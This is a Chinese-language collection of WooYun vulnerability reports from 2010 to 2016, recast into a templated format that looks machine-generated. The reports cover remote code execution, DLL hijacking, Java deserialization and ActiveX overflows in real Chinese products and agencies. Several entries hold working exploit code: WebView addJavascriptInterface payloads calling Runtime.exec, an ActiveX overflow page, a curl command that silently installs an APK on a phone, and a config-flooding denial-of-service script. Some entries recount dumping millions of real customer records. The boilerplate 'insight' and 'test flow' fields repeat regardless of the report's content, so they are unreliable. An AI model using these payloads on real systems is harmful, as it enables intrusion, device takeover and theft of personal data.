**详情**: 皮皮播放器在处理用户输入的URL时，没有对其进行长度检测。从而造成溢出。不过，由于有GS，利用的时候有些困难case 32780:v9 = *(_DWORD *)(wParam + 4096);v22 = 0;v21 = v9;*(_DWORD *)(wParam + 6344) = 1;sub_40D480(v21, v22);v42 = 5;if ( CDialog::DoModal(&v31) == 1&& ATL::CStringT<char_StrTraitMFC_DLL<char_ATL::ChTraitsCRT<char>>>::Find(&v32, "://", 0) > 0 ){v10 = (const char *)ATL::CSimpleStringT<char_1>::operator char_const__(&v32);if ( strnicmp(v10, "p

**POC**: 我们构造如下URL：“ppfilm://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

**绕过**: 直接利用

**修复**: 对用户输入的URL进行长度限制
---

---
### [wooyun-2015-0160304] ***通关服务平台S2执行老洞，ROOT权限。
**厂商**: 某电子口岸公司 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 意外发现的，其它的你们自己去查去。

**POC**: 顺便装了下13http://**.**.**.**/lisPortal/1.txt

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0146754] 电视猫远程执行代码
**厂商**: moretv.com.cn | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前看12580端口源码的时候发现ip:12580/?action=PlayPushUrl之类的调用于是找了个软件逆向了客户端apk。搜索PlayPushUrl关键字发现包含在smail/com/peersless/api/j/q.smail文件里里面还有一些网页源码里看不到的功能比如doCmd。有了它可以运行android系统的命令(普通权限)

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业。
---

---
### [wooyun-2015-0160384] 红岭创投某系统java反序列化执行漏洞管理员权限
**厂商**: tzbao.com | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0165181] 某市人力资源和社会保障局weblogic反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标ip：**.**.**.**:7001

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 打补丁
---

---
### [wooyun-2012-012232] 某航空公司代码执行
**厂商**: 某航空公司 | **年份**: 2012 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某航空公司struts 2代码执行

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0141878] PPLive视频客户端远程代码执行漏洞（附漏洞POC）
**厂商**: PPTV(PPlive) | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PPLive视频客户端存在DLL劫持漏洞。 当我们使用PPLive打开一个视频时（比如Test.mp4），PPLive.exe进程会尝试加载视频所在目录下的d3dx9_43.dll文件。 如果将视频文件与恶意的DLL文件放在同一个目录下，打包发给受害者，受害者解压后打开视频就会中招。

**POC**: 首先从官网下载一个最新的PPTV(PPLive)视频客户端，下载地址为http://**.**.**.**/pptvsetup_**.**.**.**6.exe，看一下数字签名时间：检查下是否是最新版本：现在我们需要编译一个d3dx9_43.dll文件，代码如下（弹框提示证明DLL可以被加载）：#include <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCESS_ATTACH:MessageBoxA(N

**绕过**: 直接利用

**修复**: 在PPLive.exe进程中调用SetDllDirectory("")，将当前DLL搜寻目录设置为空。
---

---
### [wooyun-2015-0146592] 某搜索引擎电视云远程安装/启动apk/桌面提示（进入wifi后的乐趣）
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏]  远程启动apphttp://[IP已脱敏]  列出先有apphttp://192

**POC**: http://[IP已脱敏]   发送提示信息http://[IP已脱敏] 会有提示http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 你们更专业。
---

---
### [wooyun-2012-09299] 某游戏平台Android客户端漏洞导致任意代码执行和密码泄漏
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某游戏平台Android客户端采用模块化设计，部分游戏以APK的行为下载到手机SD卡中，然后通过ClassLoader动态加载其中的classes.dex文件执行，从而运行不同的游戏。在这个设计中，存在两个问题：1. 保存在SD卡的文件可以被其他任意应用软件读写；2. 在动态加载存储在SD卡上的classes.dex文件之前，没有对其完整性做验证。因此，攻击者可以替换已经下载的游戏文件，替换后的代码将在用户启动该游戏时得以执行。特别的，如果攻击者对这些文件采用重打包技巧植入恶意代码或者对用户进行欺诈，可以展开进一步攻击，例如获得用户密码或者搜集本地隐私数据等。

**POC**: 1. 关于SD卡文件可以任意读写，不再用代码证明，引用一下官方文档。在下列链接中：https://example.com/[已脱敏] created on external storage, such as SD Cards, are globally readable and writable. Since external storage can be removed by the user and also modified by any application, applications should 

**绕过**: 直接利用

**修复**: 根据官方文档，If an application does retrieve executable files from external storage they should be signed and cryptographically verified prior to dynamic lo
---

---
### [wooyun-2014-068527] 某分类信息网站远程代码执行漏洞(啥都有)
**厂商**: 某分类信息网站 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考:https://example.com/[已脱敏] execute(cmdArgs){return Android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: 1,进入“通知”界面,随便点击一个链接,再通过里面某一些功能就可以了。2,接口已出。

**绕过**: 直接利用

**修复**: 某分类信息网站大公司不应该有这些低级漏洞参见:https://example.com/[已脱敏]
---

---
### [wooyun-2013-040852] AVCON多媒体通信系统全部版本存在通用型远程代码执行
**厂商**: 某信息技术公司 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜索特征：google:inurl:changLang.actionbaidu：AVCON6企业信息管理系统网络实例：[IP已脱敏]  phototemp  orgmanage  forspecial    userinfo   ordmanage  randertemphttp报文巡检：<tr><td align="right" valign="middle">选择语言</td><td align="left"><a href="changLang.action?request_locale=zh_CN" title="Chinese simplified">

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-084517] 酷派最安全手机s6浏览器问题打包
**厂商**: yulong.com | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、浏览器intent scheme 过滤不当，结合fragment注入绕过pin码poc如下：（详见https://example.com/[已脱敏] href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end">16、bypass Pin android 3.0-4.3 （selector）</a>

**POC**: 2、uxss测试地址：uxss.sinaapp.com3、开启services应用后命令执行

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2013-036369] GO短信存在远程代码执行导致数据库泄露
**厂商**: goforandroid.com | **年份**: 2013 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0109220] 某视频网站客户端设计不当可能导致任意恶意程序执行漏洞（系统限制）
**厂商**: 奇艺 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频网站术万能播放器GeePlayer.exe存在dll劫持风险，SHPlayer.exe在启动时会加载opencl.dll，这个dll在本地不存在，如果黑客将上述格式的媒体文件加上上述对应的恶意dll打包放在一起，发给用户。用户打开上述格式文件，就会执行恶意程序，危害较大。

**POC**: 1、随便建个文件夹，再将证明漏洞的opencl.dll与test.avi放在一起，打开test.avi，就会加载opencl.dll，如下图：

**绕过**: 直接利用

**修复**: 使用LoadLibrary API加载DLL时使用绝对路径
---

---
### [wooyun-2014-067661] 某社交APP远程代码执行漏洞妹子我来了
**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考:https://example.com/[已脱敏])function execute(cmdArgs){return Native_Bridge_laiwang.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: 1,先去妹子们的讨论区2,找个“好”帖子3,评论处回复测试页面:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 参见:https://example.com/[已脱敏]
---

---
### [wooyun-2016-0169068] 某区政府采购网java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 使用工具进行java反序列化测试。http://**.**.**.**/成功

**POC**: http://**.**.**.**/使用工具上传shell成功，并执行命令疑似被入侵，也要一起看看哦http://**.**.**.**/level3.jsp?id=125

**绕过**: 直接利用

**修复**: 政府大大那么多管理员就不用我多说了吧。
---

---
### [wooyun-2016-0203931] 中国国旅多个系统存在漏洞/后台沦陷/十几个数据库可操控/泄露千万客户信息/几十万注册用户密码
**厂商**: 中国国旅 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只查询了少量信息证明漏洞，没有做坏事，不要查我的水表中国国旅以下服务器均存在JAVA weblogic反序列化漏洞先看看第一台，连上服务器，已经有人来过了换下一台，连上服务器这台服务器的网站打开后会跳转到中国国旅某应用，可能会有些信息连上数据库数据库里的信息都是百万千万级的-.-，由于数量实在太多，select count耗时太久，直接看oracle视图里的NUM_ROWS吧证件信息，1154W客户信息，1205W航班信息，895W还是客户信息，569W员工账号信息随便找一个登录后台管理系统随便看一看貌似最近刚上线了新系统找个管理员的用户看下使用管理员账户登录，权限大了很多，能做的事更多了，还是不要乱玩了，免得弄出问题了员工账号共有一万多个短信下行记录，75W短信上行记录，70W不知道短信上行能做啥换台服务器登录这么一堆数据库配置，也是吓尿我了=.=再换台服务器登录，从主机名看是测试用的服

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 打补丁可以参考：修复weblogic的JAVA反序列化漏洞的多种方法https://example.com/[已脱敏]
---

---
### [wooyun-2013-027711] 美图秀秀远程代码执行漏洞
**厂商**: 美图秀秀 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美图秀秀主程序XiuXiu.exe存在dll劫持风险，XiuXiu.exe在启动时会加载dwmapi.dll，这些dll在本地不存在，如果黑客将上述格式的媒体文件加上上述对应的恶意dll打包放在一起，发给用户。用户打开上述格式文件，就会执行恶意程序，危害较大。

**POC**: 1、随便建个文件夹，再将证明漏洞的dwmapi.dll与test.png放在一起，打开test.png，就会加载dwmapi.dll，如下图：2、Poc见https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 使用LoadLibrary API加载DLL时使用绝对路径
---

---
### [wooyun-2016-0167005] 某IT集团某站点多个漏洞打包
**厂商**: 某IT集团 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某IT集团某站点漏洞打包站点：**.**.**.**:7001/newsedit/e5workspace/Login.jsp问题1：**.**.**.**:7001/console weblogic/weblogic问题2：JAVA反序列化漏洞

**POC**: 某IT集团某站点漏洞打包站点：**.**.**.**:7001/newsedit/e5workspace/Login.jsp问题1：**.**.**.**:7001/console weblogic/weblogic问题2：JAVA反序列化漏洞

**绕过**: 直接利用

**修复**: RT
---

---
### [wooyun-2015-0145718] 某搜索引擎手机助手远程静默安装启动应用漏洞(3G/4G环境下远程种马)
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: » droidportPackage                  Proto Recv-Q Send-Q         Local Address          Foreign Address        Statecom.baidu.appsearch tcp6       0      0 :::40310               :::*                   LISTENcom.baidu.appsearch tcp6       0      0 :::7777                :::*                   LISTEN发现某搜索引擎手机助手监听40310这么奇怪的端口,这里7777先按下不表.前面的分析和WooYun: 某搜索引擎输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）差不多根据端口号

**POC**: 远程上传静默安装应用curl -F file=@1.apk -e https://example.com/[已脱敏] -H "remote-addr: [IP已脱敏]" http://[IP已脱敏] -e https://example.com/[已脱敏] -H "remote-addr: [IP已脱敏]" http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0165303] 湖南地税局网站存在JAVA反序列化漏洞
**厂商**: 湖南地税局 | **年份**: 2015 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/

**POC**: 只是看了一下，没干坏事...

**绕过**: 直接利用

**修复**: 使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类在不影响业务的情况下，临时删除掉项目里的 "org/apache/commons/collections/functors/InvokerTransformer.class" 文件
---

---
### [wooyun-2015-0158826] 中国某敏感部级单位某系统JAVA反序列化漏洞
**厂商**: 中国某敏感部级单位 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mask 区域*****某系统JAVA^***********.**.************be50d4f9d371082f6ef80b.png*****

**POC**: mask 区域*****某系统JAVA^***********.**.************be50d4f9d371082f6ef80b.png*****

**绕过**: 直接利用

**修复**: 参考官方补丁
---

---
### [wooyun-2015-099276] 某视频网站客户端可被中间人攻击执行代码（利用条件较苛刻）
**厂商**: 某视频网站 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其实前提条件是必须在安装进行时进行中间人攻击。我发现某视频网站客户端（https://example.com/[已脱敏]

**POC**: 版本号：接近安装完成时，可以从左侧看到请求的https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 校验返回的https://example.com/[已脱敏]
---

---
### [wooyun-2015-0114116] 某厂商驱动插件可导致远程启动可执行恶意代码
**厂商**: 某电脑厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某厂商驱动插件DriverCDExport.ocx控件的OpenItemFilePath函数存在安全问题，可导致IE用户在浏览恶意网页时被远程启动本地的可执行文件，如cmd、calc等，或者其他程序，启动预埋的恶意程序，或者对Windows系统进行拒绝服务攻击。

**POC**: 下面的这个视频演示了这个安全问题。打开第一个地址只是启动一个计算器，打开第二个地址时无限循环启动计算器程序导致Windows无法使用。https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066836] 移联浏览器远程代码执行漏洞
**厂商**: 移联浏览器 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载移联浏览器：https://example.com/[已脱敏]

**POC**: 搜索addJavascriptInterface有两个，那就拿setting构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return setting.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'WooYun_TES

**绕过**: 直接利用

**修复**: :)
---

---
### [wooyun-2014-066535] 冒泡浏览器远程代码执行漏洞
**厂商**: 斯凯网络 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载冒泡浏览器最新版：https://example.com/[已脱敏]

**POC**: 搜索addJavascriptInterface就拿其中的hardwareAccelerateObject构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return hardwareAccelerateObject.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/syste

**绕过**: 直接利用

**修复**: :)
---

---
### [wooyun-2015-099196] 迅雷游戏盒子可被中间人攻击导致持久性拒绝服务
**厂商**: 迅雷 | **年份**: 2015 | **类型**: 拒绝服务

**元思考**: 触发信号: 功能测试

**洞察**: 拒绝服务防护不足，开发者信任前端输入

**测试流程**:
1. 识别拒绝服务相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 迅雷游戏盒子打开时会向https://example.com/[已脱敏])这个API可以写入本地配置文件，没有做限制。比如：window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true")可以使游戏盒子开机自动启动。这个本地文件保存在%APPDATA%\迅雷游戏\XLGameBox\Data\xggb_config.ini。因为没有用HTTPS，所以中间人可以劫持游戏盒子的网页请求，这样中间人即可任意写本地配置文件。我找了半天，没发现有特别危险的配置，比如代码执行，下载文件。我也不想就这么算了，所以那就破坏呗。所以我就用setInterval循环向配置文件里写入大量无用信

**POC**: 版本号：劫持https://example.com/[已脱敏] html><html><head><meta charset="UTF-8"><title>Test</title><script>var val_w = new Array(1024*1024).join("a");var i = 0;window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true"); //开机自动启动window.external.SetConfigData(

**绕过**: 直接利用

**修复**: 首先让网页直接修改本地文件是危险的，不能不重视中间人攻击。如果你们之后加个能够用来执行代码的配置，那就不止拒绝服务这么简单了。任何通过HTTP（非HTTPS）下载的页面是不能信任的。所以SetConfigData能不公开给网页就不公开，即使非要用，要么用HTTPS，强制HTTPS网页才能改设置；要么
---

---
### [wooyun-2014-066056] 芒果云KODExlporer设计缺陷任意代码执行
**厂商**: kalcaddle.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] ,重命名成功，空格被忽略，文件后缀变为php可以成功执行。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂
---

---
### [wooyun-2013-046784] 射手影音播放器远程代码执行漏洞
**厂商**: 射手网 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 射手影音播放器最新版（版本3.7 build 2437），官方下载安装版本SPlayerSetup.exe，windows xp sp4环境，射手影音播放器在播放特定类型影音文件时会加载某些不存在的dll文件（这些文件没有随射手影音播放器一起安装），导致恶意攻击者可以伪造DLL文件用于劫持，诱骗用户打开远程共享下的影音文件来加载恶意代码，严重危害用户的系统安全。附列表如下：d3dx9_39.dlld3dx9_40.dlld3dx9_41.dlld3dx9_42.dlld3dx9_43.dlld3dx9_44.dlld3dx9_45.dlldwmapi.dlliacenc.dllnvcuda.dll

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格DLL加载审查。
---

---
### [wooyun-2011-03671] 搜狗浏览器远程代码执行漏洞
**厂商**: 搜狗 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只需要加一行代码，漏洞又跑起来了。

**POC**: 只需要把网上公开的POC里的test2.html 稍微修改一点，增加一行alert("It is crashed?")，给个告警提示，使得运行时序变化，热补后访问就会经常奔溃，很少情况下能再次弹出计算器。

**绕过**: 直接利用

**修复**: 乱测出来的，不知道咋补。
---

---
### [wooyun-2010-0369] 某证券公司网上交易安全控件存在远程溢出漏洞
**厂商**: 某证券公司 | **年份**: 2010 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件:CsswebUsb.ocx版本:[IP已脱敏]clsid:30A3ACF9-DA6E-4CA0-A081-E06282DF1C64属性：GetErrInfo

**POC**: +target.GetErrInfo(SOMELONGSTR)+HeapSpray+Bingo

**绕过**: 直接利用

**修复**: 限制参数长度吧
---

---
### [wooyun-2012-09542] 某财经网远程执行
**厂商**: 某金融控股公司 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华富财经网  是香港上市公司某金融控股公司 (股份代号0952) 旗下的财经信息服务网站，于1998年成立﹔是香港首屈一指的财经信息网站，一直致力为机构性及个别投资者提供最有效的工具，让他们能在适当的时候作出决定。Quamnet以研究及分析港股市场为主，由多名专业的财经分析员撰写评论文章，网站的财经研究部更是全港最大，最专业的独立港股分析团队之一。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: struts
---

---
### [wooyun-2015-0160397] 云南省网络交易监管服务网java反序列化漏洞
**厂商**: 某省工商局 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**:7001/nweb/外网服务器开了3389管理员权限进服务器分分钟，就不加账号了，管理员自行测试

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-024077] SafeSign加密组件 Dll Hijacking（某行网银引入）
**厂商**: SafeSign | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手头有个某商银行的网银，用的是捷德的UKEY，捷德的UKEY使用了国外SafeSign的加密组件。这个组件注册到系统中后，会在数字证书验证时被调用到。组件会加载一个叫做aetcmgr的DLL，但是这个DLL并未被安装到系统中，而且调用时未指定全路径。因此会照成一个dll hijacking。比如我把一个会打开https的网址的网页和一个空的aetcmgr.dll发给另外一个人的话，如果那人装了工行的网银，IE就会在打开网页时加载aetcmgr.dll。测试网页如下如下，XXX请替换为任意一个https的网址：<head><meta http-equiv="refresh" content="0;url=https://XXXX"></html>aetcmgr.dll 在DLLMAIN中弹了一个MSGBOX。IE的调用栈如下因为这个组件是注册到系统中的，所以这个漏洞可大可小，会影响到很多验证

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加载DLL时使用全路径
---

---
### [wooyun-2016-0204078] 申万宏源证券某测试系统存在漏洞/涉及百万客户真实信息/部分员工信息
**厂商**: 申万宏源证券 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只查了很少的数据证明漏洞存在，没有做坏事，不要查我的水表申万宏源的这个测试系统存在JAVA weblogic反序列化漏洞连上服务器，真的是测试服务器，系统时间都不是当前时间连上数据库客户信息，有姓名，身份证号，手机号，开户网点109W客户信息不知道是什么人员的信息，邮箱全是@gaotime.com521个从邮箱看应该是员工信息，有姓名，手机号，身份证号，邮箱，MSN，某互联网公司，家庭住址4000多个不知道是什么短信37W短信这个是基金经理的信息么1000多个连上另一个数据库看看还是客户信息，有姓名，手机号，身份证号，家庭住址1.5W客户信息不知道是什么信息100多个

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 打补丁生产数据导到测试环境总要脱敏的啦
---

---
### [wooyun-2015-0103131] 某银行控件代码注入可获取密码杀毒不报
**厂商**: 某银行 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027452] 139邮箱某插件远程代码执行漏洞
**厂商**: 139邮箱 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 邮箱里面那个截屏工具的插件不只底下说的这一个问题,就举个栗子而已问题文件 cxdndctrl.dll （[IP已脱敏]）clsid   0CEFA82D-A26D-491C-BAF7-604441B409FD问题函数 setuserid()提交超长字符串作为参数给setuserid ie崩溃这个点要拿来执行命令有点难度 具体原因有兴趣的可以自己回去试试

**POC**: poc<html><object classid='clsid:0CEFA82D-A26D-491C-BAF7-604441B409FD' id='target'></object><script>var poc='';for (var i=0;i<44444;i++){poc +='A';}target.setuserid(poc);</script></html>

**绕过**: 直接利用

**修复**: 检查输入
---

---
### [wooyun-2015-0118241] 某视频网站TV被挂马导致大量用户面临IE远程执行漏洞危险(一个由某视频网站TV网站引起的血案)
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: 恶意信息传播

**元思考**: 触发信号: 功能测试

**洞察**: 恶意信息传播防护不足，开发者信任前端输入

**测试流程**:
1. 识别恶意信息传播相关功能
2. 构造测试Payload
3. 验证漏洞响应

